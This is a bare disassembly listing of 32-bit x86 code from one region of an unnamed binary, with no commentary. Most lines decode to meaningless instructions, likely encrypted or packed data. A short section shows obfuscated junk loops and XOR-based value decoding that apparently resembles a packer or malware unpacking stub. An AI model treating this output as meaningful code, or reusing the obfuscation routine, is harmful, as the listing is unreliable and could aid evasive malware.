  408a9c:	cmp    DWORD PTR [edx+esi*1+0x53],0xffffffe0
  408aa1:	call   0xceb8:0x28beadc3
  408aa8:	sahf   
  408aa9:	ins    DWORD PTR es:[edi],dx
  408aaa:	je     0x408aae
  408aac:	fadd   st(5),st
  408aae:	cwde   
  408aaf:	sbb    edi,0x7d8b9b7f
  408ab5:	or     BYTE PTR [ebx-0x75c345c1],cl
  408abb:	add    BYTE PTR [eax],al
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	test   al,0x4d
  408b1c:	les    esp,FWORD PTR ds:0x7e7edeae
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	fldenv [edi+ecx*2+0x42]
  408b2a:	xor    eax,0x27bc7f4a
  408b2f:	fdiv   DWORD PTR [ecx+0x4943f4ad]
  408b35:	lea    ecx,[ebp*2+0x7975bbb6]
  408b3c:	retf   
  408b3d:	data16 lahf 
  408b3f:	mov    esi,0x8be9a3c5
  408b44:	rol    BYTE PTR [ebp+0x59aa26a3],cl
  408b4a:	cli    
  408b4b:	imul   edi,edx,0xffffff81
  408b4e:	call   0x3473:0x57e68d73
  408b55:	std    
  408b56:	inc    edx
  408b57:	dec    ebp
  408b58:	int    0x95
  408b5a:	dec    edx
  408b5b:	lds    eax,FWORD PTR [ebx+0x78]
  408b5e:	push   cs
  408b5f:	sbb    eax,0x184df208
  408b64:	add    BYTE PTR [ebx],dl
  408b66:	pop    ebx
  408b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b68:	ret    0x4a9e
  408b6b:	cwde   
  408b6c:	test   eax,0xaddeb723
  408b71:	les    esi,FWORD PTR [esi-0x7]
  408b74:	cmp    al,0xdc
  408b76:	mov    eax,0x8faadc8f
  408b7b:	pop    eax
  408b7c:	call   0xe0a5:0x24e9a29d
  408b83:	das    
  408b84:	aam    0x43
  408b86:	scas   al,BYTE PTR es:[edi]
  408b87:	push   ds
  408b88:	out    0xd7,eax
  408b8a:	sub    BYTE PTR [esi],cl
  408b8c:	dec    ebp
  408b8d:	lods   al,BYTE PTR ds:[esi]
  408b8e:	shl    DWORD PTR [ebp-0x3cb6b45c],cl
  408b94:	mov    al,ds:0x1b910453
  408b99:	inc    esp
  408b9a:	xor    eax,0x469b5a50
  408b9f:	sub    eax,0xc0c06d9a
  408ba4:	adc    eax,DWORD PTR [esi]
  408ba6:	aas    
  408ba7:	iret   
  408ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ba9:	(bad)  
  408baa:	and    DWORD PTR [eax-0x7eb486d7],ebx
  408bb0:	scas   al,BYTE PTR es:[edi]
  408bb1:	add    eax,0x84cacbfc
  408bb6:	fwait
  408bb7:	xor    eax,0x81cd4d1b
  408bbc:	gs repz pop eax
  408bbf:	call   0x42093760
  408bc4:	retf   
  408bc5:	aas    
  408bc6:	xor    al,cl
  408bc8:	dec    eax
  408bc9:	not    bl
  408bcb:	xchg   ebx,eax
  408bcc:	push   esp
  408bcd:	lahf   
  408bce:	repz mov ebx,0x5114102
  408bd4:	adc    eax,0x6247baf
  408bd9:	(bad)  
  408bda:	push   edi
  408bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bdc:	xchg   ecx,eax
  408bdd:	adc    DWORD PTR [edi+0x39],ebp
  408be0:	icebp  
  408be1:	xchg   ebp,eax
  408be2:	(bad)  
  408be3:	jmp    0x45d0:0xcdd3e409
  408bea:	xor    dh,dl
  408bec:	retf   
  408bed:	(bad)
  408bf1:	xchg   esi,eax
  408bf2:	sub    BYTE PTR [edi-0x19],ah
  408bf5:	cmp    ebx,DWORD PTR [ecx+0x9]
  408bf8:	call   0x2501b8f7
  408bfd:	jae    0x408c06
  408bff:	inc    eax
  408c00:	mov    edi,0xa8262d3e
  408c05:	push   ebx
  408c06:	cdq    
  408c07:	test   al,0x37
  408c09:	mov    bl,0xe2
  408c0b:	cld    
  408c0c:	push   eax
  408c0d:	es jmp 0x8191:0x84452995
  408c15:	mov    BYTE PTR [esi],al
  408c17:	mov    eax,ds:0x546ef4a1
  408c1c:	call   0x7047b863
  408c21:	mov    ds:0x3eb5acfa,al
  408c26:	fwait
  408c27:	cmovnp ecx,DWORD PTR [edi]
  408c2a:	es retf 
  408c2c:	out    0x1e,eax
  408c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c2f:	mov    ebp,0x1c68d0f1
  408c34:	les    ebx,FWORD PTR [eax]
  408c36:	push   eax
  408c37:	jecxz  0x408c11
  408c39:	sahf   
  408c3a:	adc    al,0x3e
  408c3c:	jecxz  0x408c36
  408c3e:	push   es
  408c3f:	jne    0x408ca4
  408c41:	jns    0x408c94
  408c43:	test   BYTE PTR [edx+0x67d79b86],ch
  408c49:	add    eax,ebx
  408c4b:	cld    
  408c4c:	pop    esp
  408c4d:	ret    
  408c4e:	lea    eax,[eax-0x4e]
  408c51:	daa    
  408c52:	in     al,0xe3
  408c54:	call   0x20f45cdf
  408c59:	data16 cmp al,0x39
  408c5c:	fnstsw WORD PTR [ebx]
  408c5e:	leave  
  408c5f:	add    eax,0xb5e62bb8
  408c64:	int    0xde
  408c66:	in     eax,0x3f
  408c68:	sbb    al,bl
  408c6a:	xchg   edi,eax
  408c6b:	stos   DWORD PTR es:[edi],eax
  408c6c:	push   eax
  408c6d:	sub    BYTE PTR [edx+0x71],dh
  408c70:	xor    DWORD PTR [esi+0x77],0x8021d21
  408c77:	xchg   bh,dl
  408c79:	push   edx
  408c7a:	mov    ecx,edx
  408c7c:	cli    
  408c7d:	(bad)  
  408c7e:	jg     0x408c8c
  408c80:	mov    eax,ebp
  408c82:	jge    0x408c9e
  408c84:	sti    
  408c85:	and    eax,0x59b6895e
  408c8a:	js     0x408cfa
  408c8c:	pop    ebx
  408c8d:	lds    edi,FWORD PTR [esi+0xfd60394]
  408c93:	scas   eax,DWORD PTR es:[edi]
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	pop    ds
  408cb7:	jnp    0x408c4f
  408cb9:	sbb    al,0x14
  408cbb:	fdivr  QWORD PTR [esi+0x7e]
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	push   es
  408cc3:	push   esp
  408cc4:	push   cs
  408cc5:	(bad)  
  408cc6:	shr    BYTE PTR [ebx+0x58],cl
  408cc9:	push   cs
  408cca:	ror    BYTE PTR [edi],0x1e
  408ccd:	cmp    eax,0xb55bd05c
  408cd2:	ja     0x408c87
  408cd4:	inc    ebx
  408cd5:	daa    
  408cd6:	pop    edx
  408cd7:	push   ds
  408cd8:	add    BYTE PTR [ebx-0xfca7699],0xcd
  408cdf:	fcmovu st,st(4)
  408ce1:	fwait
  408ce2:	jbe    0x408d5b
  408ce4:	pusha  
  408ce5:	mov    esi,0x6389e4f8
  408cea:	jle    0x408d66
  408cec:	jnp    0x408cac
  408cee:	loope  0x408c81
  408cf0:	fsubr  QWORD PTR [edi+ebx*8]
  408cf3:	icebp  
  408cf4:	adc    BYTE PTR [edx-0x798170ab],0x1f
  408cfb:	jo     0x408d2b
  408cfd:	jp     0x408ced
  408cff:	xlat   BYTE PTR cs:[ebx]
  408d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d02:	push   ds
  408d03:	call   0x3b9:0x63168772
  408d0a:	shr    dl,0xbe
  408d0d:	push   eax
  408d0e:	pop    ecx
  408d0f:	push   eax
  408d10:	pop    es
  408d11:	cmp    al,bl
  408d13:	fisub  WORD PTR [eax+0x409cdbe3]
  408d19:	test   BYTE PTR [ecx],dh
  408d1b:	js     0x408cb9
  408d1d:	test   eax,0x6c72a9ad
  408d22:	cli    
  408d23:	sahf   
  408d24:	cmp    DWORD PTR [esi-0x57],esi
  408d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d28:	sub    ch,BYTE PTR ds:0xd66cddd4
  408d2e:	jge    0x408d20
  408d30:	lods   eax,DWORD PTR ds:[esi]
  408d31:	(bad)  
  408d32:	div    BYTE PTR [ebp-0x3c0f0f04]
  408d38:	or     BYTE PTR [esp+eax*4],0x26
  408d3c:	and    BYTE PTR [ebx+eax*1+0x2a3ee6b6],dh
  408d43:	adc    al,0xdf
  408d45:	xchg   esp,eax
  408d46:	mov    cl,dl
  408d48:	or     DWORD PTR [esi+0x196a47cb],ecx
  408d4e:	out    dx,eax
  408d4f:	mov    eax,0x4a1f99d1
  408d54:	xchg   esi,eax
  408d55:	sbb    DWORD PTR [esi+ebp*1],ebx
  408d58:	mov    eax,ds:0x85b03499
  408d5d:	inc    edi
  408d5e:	jae    0x408d44
  408d60:	stos   DWORD PTR es:[edi],eax
  408d61:	je     0x408ce8
  408d63:	popa   
  408d64:	sti    
  408d65:	fs and al,0x82
  408d68:	sub    DWORD PTR [edi-0x56ac98aa],0xffffff97
  408d6f:	out    dx,eax
  408d70:	gs inc ebp
  408d72:	popa   
  408d73:	ja     0x408cf9
  408d75:	daa    
  408d76:	or     al,0xc2
  408d79:	jns    0x408d2d
  408d7b:	add    esp,DWORD PTR [edi+esi*1-0x5bb18ea5]
  408d82:	xchg   al,bh
  408d84:	sar    BYTE PTR [ecx-0x6d609b20],1
  408d8a:	cmp    eax,0xa1d9de0e
  408d8f:	sahf   
  408d90:	jp     0x408d4a
  408d92:	jmp    0x408da7
  408d94:	sbb    ecx,DWORD PTR ds:0x96a6de03
  408d9a:	sar    edx,0x22
  408d9d:	outs   dx,BYTE PTR ds:[esi]
  408d9e:	sahf   
  408d9f:	xchg   sp,ax
  408da1:	xor    DWORD PTR [bp+di],eax
  408da4:	lods   al,BYTE PTR ds:[esi]
  408da5:	popf   
  408da6:	mov    bh,BYTE PTR [eax+0x36]
  408da9:	in     eax,0xc7
  408dab:	sbb    eax,0x88b1a232
  408db0:	push   ebp
  408db1:	rcl    DWORD PTR [esp+edx*2],cl
  408db4:	jo     0x408e04
  408db6:	sbb    BYTE PTR [ebp+ecx*4+0x20],al
  408dba:	mov    ch,0x5
  408dbc:	add    ch,BYTE PTR [edx-0x1a]
  408dbf:	scas   eax,DWORD PTR es:[edi]
  408dc0:	mov    ah,0xbc
  408dc2:	imul   eax,DWORD PTR [ebx],0x7
  408dc5:	mov    eax,ds:0xb47cce29
  408dca:	mov    al,ds:0xb85fc1a1
  408dcf:	in     eax,dx
  408dd0:	mov    esi,0xfe2e05e0
  408dd5:	mov    eax,0x1b50379b
  408dda:	(bad)  
  408ddc:	pusha  
  408ddd:	xor    eax,0x8f3bbc9c
  408de2:	cmp    BYTE PTR [ebp+0x62a76d2b],al
  408de8:	pushf  
  408de9:	push   ebx
  408dea:	mov    esi,0x50c2842f
  408def:	jb     0x408e3e
  408df1:	imul   esi,DWORD PTR [ebp-0x5414b77c],0x3c5da9b4
  408dfb:	add    DWORD PTR [esp+ecx*4],0x8b8558a5
  408e02:	mov    eax,0xcafa2e76
  408e07:	call   0x251d4c14
  408e0c:	mov    ecx,eax
  408e0e:	mov    ch,0x5a
  408e10:	dec    ecx
  408e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e12:	ja     0x408e21
  408e14:	mul    dl
  408e16:	pop    edi
  408e17:	ds push esi
  408e19:	fbld   TBYTE PTR [esi]
  408e1b:	or     bl,BYTE PTR [edi]
  408e1d:	scas   al,BYTE PTR es:[edi]
  408e1e:	xor    esi,DWORD PTR [ecx-0x71aef8ba]
  408e24:	das    
  408e25:	ds pop ds
  408e27:	fwait
  408e28:	push   esp
  408e29:	test   bh,dl
  408e2b:	mov    ds:0x5b3dc233,eax
  408e30:	or     al,0xa8
  408e32:	jp     0x408e43
  408e34:	test   BYTE PTR [ecx-0x9],dl
  408e37:	(bad)  
  408e38:	dec    DWORD PTR [ebx+0x81f045]
  408e3e:	add    DWORD PTR ds:0x43e90740,esi
  408e44:	idiv   edi
  408e46:	dec    DWORD PTR [ebx-0x7d161bbb]
  408e4c:	add    DWORD PTR [eax],eax
  408e4e:	add    BYTE PTR ds:0xa417048d,dh
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0x60d871e8
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	repz xchg edx,eax
  408e69:	xor    DWORD PTR [ebx+edx*2-0x3f675f16],edx
  408e70:	xchg   ecx,eax
  408e71:	cs imul eax,ebx,0x4
  408e75:	xchg   edx,eax
  408e76:	mov    ds:0x89be8e84,al
  408e7b:	push   eax
  408e7c:	daa    
  408e7d:	and    al,0xf3
  408e7f:	dec    edi
  408e80:	mov    esp,0xb3305d8f
  408e85:	push   0xc
  408e87:	pop    ss
  408e88:	pop    es
  408e89:	les    ebx,FWORD PTR [esi-0x7f526b3a]
  408e8f:	mov    ds:0x530ebf11,eax
  408e94:	pop    es
  408e95:	inc    dh
  408e97:	aam    0xd6
  408e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9a:	fld    TBYTE PTR [ebp-0x40]
  408e9d:	xchg   BYTE PTR [ebp+edx*1+0x1],cl
  408ea1:	enter  0x8102,0xcd
  408ea5:	xchg   edi,eax
  408ea6:	inc    ebx
  408ea7:	cmc    
  408ea8:	daa    
  408ea9:	add    BYTE PTR [edi-0x19],dh
  408eac:	mov    bh,0x53
  408eae:	pop    esi
  408eaf:	inc    esp
  408eb0:	cld    
  408eb1:	jbe    0x408e4a
  408eb3:	jmp    0x4c374b0b
  408eb8:	fisttp QWORD PTR [eax-0x3b]
  408ebb:	(bad)  
  408ebc:	sbb    ah,ah
  408ebe:	(bad)  
  408ebf:	in     eax,0x68
  408ec1:	test   al,0xbe
  408ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ec4:	xor    esi,DWORD PTR [ecx+0x2e81e909]
  408eca:	cmp    al,0xa2
  408ecc:	enter  0x1da0,0xfe
  408ed0:	sub    dh,BYTE PTR [edx+0x2df5e787]
  408ed6:	scas   al,BYTE PTR es:[edi]
  408ed7:	or     bh,BYTE PTR [esi]
  408ed9:	leave  
  408eda:	fld    QWORD PTR [edi-0x3d]
  408edd:	mov    esp,0xf84e771b
  408ee2:	pop    ecx
  408ee3:	repz pusha 
  408ee5:	add    eax,0xa11bd3aa
  408eea:	adc    BYTE PTR [edx],bl
  408eec:	pop    esi
  408eed:	sysenter 
  408eef:	push   ecx
  408ef0:	imul   ebp,DWORD PTR [ecx],0xffffffbf
  408ef3:	or     al,0xcb
  408ef5:	mov    bh,0xa4
  408ef7:	jae    0x408e79
  408ef9:	nop
  408efa:	pushf  
  408efb:	pop    ecx
  408efc:	jge    0x408efa
  408efe:	add    al,0xc5
  408f00:	inc    eax
  408f01:	inc    ebp
  408f02:	(bad)  
  408f04:	int    0x19
  408f06:	mov    WORD PTR [edx],?
  408f08:	out    dx,al
  408f09:	inc    ebp
  408f0a:	xor    DWORD PTR [edi+0x270976fc],edi
  408f10:	adc    eax,0xe5350b63
  408f15:	pusha  
  408f16:	xchg   edx,esi
  408f18:	daa    
  408f19:	cmp    DWORD PTR [esi-0x1],ebx
  408f1c:	mov    dl,0xeb
  408f1e:	and    eax,DWORD PTR [ecx-0xc09d795]
  408f24:	pop    es
  408f25:	shl    dl,0x2a
  408f28:	add    BYTE PTR [eax],ah
  408f2a:	pusha  
  408f2b:	dec    ebx
  408f2c:	stc    
  408f2d:	icebp  
  408f2e:	add    cl,cl
  408f30:	in     eax,dx
  408f31:	repz xor al,0x6f
  408f34:	leave  
  408f35:	push   eax
  408f36:	mov    ch,0x5a
  408f38:	xor    eax,0x56ce76ad
  408f3d:	das    
  408f3e:	test   al,0x59
  408f40:	imul   ecx,esp,0x2edfafa0
  408f46:	and    esi,esp
  408f48:	into   
  408f49:	pop    eax
  408f4a:	outs   dx,BYTE PTR ds:[esi]
  408f4b:	pop    esi
  408f4c:	(bad)  
  408f4d:	(bad)  
  408f4e:	int3   
  408f4f:	shl    BYTE PTR [eax],1
  408f51:	sub    eax,0xa1b3bef9
  408f56:	push   es
  408f57:	mul    DWORD PTR [ecx]
  408f59:	push   0x23
  408f5b:	or     eax,0x1869dd62
  408f60:	add    al,0xe1
  408f62:	test   al,0x54
  408f64:	and    al,0x32
  408f66:	or     al,0xc8
  408f68:	xchg   edi,eax
  408f69:	mov    cl,0xd2
  408f6b:	mov    esp,0xa3b25504
  408f70:	loop   0x408f0e
  408f72:	in     eax,0x45
  408f74:	xor    eax,0x6c24b88f
  408f79:	cmp    eax,esp
  408f7b:	cmp    dh,BYTE PTR [ebx]
  408f7d:	stc    
  408f7e:	jp     0x408f08
  408f80:	pop    ds
  408f81:	push   eax
  408f82:	dec    edx
  408f83:	or     eax,0xb66d0662
  408f88:	xchg   DWORD PTR [ebp-0x2e],edx
  408f8b:	(bad)  
  408f8c:	jmp    0x408fa7
  408f8e:	xchg   edx,eax
  408f8f:	xor    DWORD PTR [ebx+0x16],esp
  408f92:	rcr    DWORD PTR [ecx-0x5b],0x15
  408f96:	addr16 stc 
  408f98:	aad    0xc4
  408f9a:	(bad)  
  408f9b:	stos   DWORD PTR es:[edi],eax
  408f9c:	popf   
  408f9d:	sbb    eax,0xb238f214
  408fa2:	shr    BYTE PTR [ecx],cl
  408fa4:	and    al,0x64
  408fa6:	daa    
  408fa7:	pop    ebp
  408fa8:	sub    edx,ebp
  408faa:	adc    esp,DWORD PTR [eax]
  408fac:	inc    BYTE PTR [eax-0x53859412]
  408fb2:	lods   eax,DWORD PTR ds:[esi]
  408fb3:	mov    dh,0x76
  408fb5:	add    ch,BYTE PTR [edx+0x6c]
  408fb8:	shl    esp,0xa5
  408fbb:	retf   0xeb2f
  408fbe:	jmp    0xbdf:0xdfd9ab46
  408fc5:	aaa    
  408fc6:	fdivrp st(1),st
  408fc8:	lahf   
  408fc9:	cmp    DWORD PTR [esi+esi*2-0x52],0x707f270f
  408fd1:	cmp    DWORD PTR [eax],edi
  408fd3:	je     0x40858a
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	pop    ecx
  409165:	fcomp  st(4)
  409167:	frstor [eax-0x26]
  40916a:	jle    0x4091ea
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	sub    eax,0x9b5eef4f
  409175:	mov    edi,0x967d8d30
  40917a:	jle    0x4091ca
  40917c:	xchg   ebx,eax
  40917d:	jne    0x409138
  40917f:	push   ecx
  409180:	imul   BYTE PTR [ebp+ebx*2-0x709ed45c]
  409187:	adc    al,0xab
  409189:	out    dx,al
  40918a:	(bad)  
  40918b:	jp     0x409116
  40918d:	mov    BYTE PTR [ebx],bh
  40918f:	mov    dh,0xa1
  409191:	adc    eax,0x208fb0f4
  409196:	test   eax,0xc6421188
  40919b:	mov    ch,0x77
  40919d:	xchg   ecx,eax
  40919e:	xchg   edi,eax
  40919f:	test   al,0x6
  4091a1:	dec    esp
  4091a2:	pop    ds
  4091a3:	add    BYTE PTR [ecx-0x6362f6eb],0xfc
  4091aa:	add    dl,dh
  4091ac:	add    ecx,DWORD PTR [edi]
  4091ae:	xchg   BYTE PTR [esi+ebx*8-0x4e],ah
  4091b2:	subps  xmm4,XMMWORD PTR [eax-0x33289652]
  4091b9:	nop
  4091ba:	out    dx,al
  4091bb:	addr16 push ebx
  4091bd:	mov    bl,BYTE PTR [ebx]
  4091bf:	mov    eax,ds:0x2e6802bd
  4091c4:	loopne 0x4091e6
  4091c6:	sbb    esi,DWORD PTR [esi]
  4091c8:	xlat   BYTE PTR ds:[ebx]
  4091c9:	cld    
  4091ca:	jge    0x4091f8
  4091cc:	push   0x9c5ac9e3
  4091d1:	jbe    0x40923b
  4091d3:	ror    esp,1
  4091d5:	sbb    BYTE PTR [esi-0x3b4e2491],dl
  4091db:	outs   dx,BYTE PTR ds:[esi]
  4091dc:	mov    ebx,edx
  4091de:	ja     0x40923e
  4091e0:	push   esi
  4091e1:	(bad)  
  4091e2:	setge  dh
  4091e5:	sub    al,0x3
  4091e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e8:	ficomp WORD PTR [ebp-0x6a90aae9]
  4091ee:	test   al,0x23
  4091f0:	push   ds
  4091f1:	lods   eax,DWORD PTR ds:[esi]
  4091f3:	sub    BYTE PTR [eax+0x6c],cl
  4091f6:	sub    al,0x1a
  4091f8:	mov    dh,0x98
  4091fa:	(bad)  
  4091fb:	iret   
  4091fc:	pop    ds
  4091fd:	stos   DWORD PTR es:[edi],eax
  4091fe:	mov    al,0xde
  409200:	push   edx
  409201:	pop    edx
  409202:	sahf   
  409203:	fistp  WORD PTR [eax-0x64537768]
  409209:	imul   esi,DWORD PTR [ebx+0x49],0x6744f72c
  409210:	xlat   BYTE PTR ds:[ebx]
  409211:	lods   al,BYTE PTR ds:[esi]
  409212:	mov    esp,0xdb7fac23
  409217:	sti    
  409218:	jp     0x409205
  40921a:	repnz fcomp DWORD PTR [eax+0x72]
  40921e:	push   ds
  40921f:	jl     0x409251
  409221:	clc    
  409222:	xor    edx,esp
  409224:	push   0x47b5a51b
  409229:	retf   
  40922a:	xchg   edx,esp
  40922c:	mov    esi,0xea622d94
  409231:	or     DWORD PTR [edi+ebp*4],esi
  409234:	scas   al,BYTE PTR es:[edi]
  409235:	sub    esi,DWORD PTR [ecx+0x3a]
  409238:	cmp    BYTE PTR [ecx],bl
  40923a:	das    
  40923b:	ins    BYTE PTR es:[edi],dx
  40923c:	dec    esp
  40923d:	inc    ecx
  40923e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40923f:	inc    eax
  409240:	test   DWORD PTR [edx+0x45],ebx
  409243:	fistp  WORD PTR [edi+0x65]
  409246:	mov    ?,WORD PTR [edi]
  409248:	lods   al,BYTE PTR ds:[esi]
  409249:	loop   0x40922c
  40924b:	inc    edi
  40924c:	jmp    0xb5abc052
  409251:	mov    ebp,0x81627dd4
  409256:	sbb    esi,ecx
  409258:	(bad)  
  409259:	nop
  40925a:	mov    bh,0x63
  40925c:	xor    eax,0xaac6619
  409261:	sbb    al,0x38
  409263:	mov    edx,0x98f8448a
  409268:	mov    bl,0x4
  40926a:	call   0xa520:0xeebf5231
  409271:	sub    bh,ah
  409273:	pop    ss
  409274:	mov    dl,0x3a
  409276:	shl    DWORD PTR [edi],0xb3
  409279:	dec    ebx
  40927a:	(bad)  
  40927b:	hlt    
  40927c:	ins    DWORD PTR es:[edi],dx
  40927d:	pop    ss
  40927e:	inc    ecx
  40927f:	jno    0x40924f
  409281:	cwde   
  409282:	sbb    DWORD PTR ds:0x2302adc6,edi
  409288:	int3   
  409289:	sub    DWORD PTR [esi+0xb2e2ad7],0x44
  409290:	mov    edx,0x31e5fdda
  409295:	ja     0x4092a9
  409297:	lods   al,BYTE PTR ds:[esi]
  409298:	ss out 0x15,eax
  40929b:	lds    ecx,FWORD PTR [edi+edx*2]
  40929e:	jp     0x409299
  4092a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092a1:	outs   dx,DWORD PTR ds:[esi]
  4092a2:	mov    ch,0x4e
  4092a4:	pop    edx
  4092a5:	out    0x43,eax
  4092a7:	in     eax,dx
  4092a8:	fisubr DWORD PTR ss:[edx+ecx*4-0x57f8fd1b]
  4092b0:	jns    0x409281
  4092b2:	jge    0x409237
  4092b4:	pop    esi
  4092b5:	ds pop edi
  4092b7:	in     eax,0xa1
  4092b9:	nop
  4092ba:	inc    ecx
  4092bb:	cmp    al,ch
  4092bd:	mov    ch,0xf1
  4092bf:	adc    DWORD PTR [esi],0xffffff9f
  4092c2:	or     eax,0xc8f887ce
  4092c7:	xchg   edx,eax
  4092c8:	pop    ebx
  4092c9:	dec    ebx
  4092ca:	push   edx
  4092cb:	jp     0x4092d1
  4092cd:	mov    esp,fs
  4092cf:	add    dl,ah
  4092d1:	ins    BYTE PTR es:[edi],dx
  4092d2:	jns    0x4092b2
  4092d4:	js     0x40930b
  4092d6:	(bad)  
  4092d8:	scas   al,BYTE PTR es:[edi]
  4092d9:	ret    0xbc48
  4092dc:	xlat   BYTE PTR ds:[ebx]
  4092dd:	sbb    DWORD PTR [ebp-0x75e17877],edx
  4092e3:	hlt    
  4092e4:	xchg   ah,dh
  4092e6:	dec    esi
  4092e7:	hlt    
  4092e8:	jnp    0x40926e
  4092ea:	test   BYTE PTR [ebx],cl
  4092ec:	add    al,0x60
  4092ee:	out    0x6,al
  4092f0:	xchg   ecx,eax
  4092f1:	inc    edx
  4092f2:	inc    edx
  4092f3:	popf   
  4092f4:	gs xor ah,ah
  4092f7:	add    DWORD PTR [ebx],eax
  4092f9:	pop    edx
  4092fa:	es mov eax,0x604e6cf7
  409300:	or     BYTE PTR [esi+0x65],0xe2
  409304:	jle    0x40930f
